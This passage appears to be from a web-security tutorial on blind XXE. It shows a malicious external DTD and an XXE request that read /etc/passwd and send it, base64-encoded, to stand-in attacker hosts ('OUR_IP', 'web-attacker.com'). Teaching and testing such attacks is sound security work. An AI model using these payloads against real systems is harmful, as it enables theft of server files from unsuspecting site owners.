Exfiltrating sensitive data in blind XXE is hard but not possible. This can be achieved by hosting a malicious DTD on a system that an attacker controls and then invoking it within the XXE payload. An example of a malicious DTD to exfiltrate contents of `/etc/passwd`:
```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

The attacker must then host the malicious DTD on a system they control. For example, the attacker might serve it at the following URL: `https://web-attacker.com/malicious.dtd`.

Finally, the attacker must submit the following XXE payload to the vulnerable application:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://web-attacker.com/malicious.dtd">
  %remote;
  %oob;
]>
<stockCheck><productId>&content;</productId></stockCheck> <!-- Reference the content from ENTITY in our malicious.dtd -->
```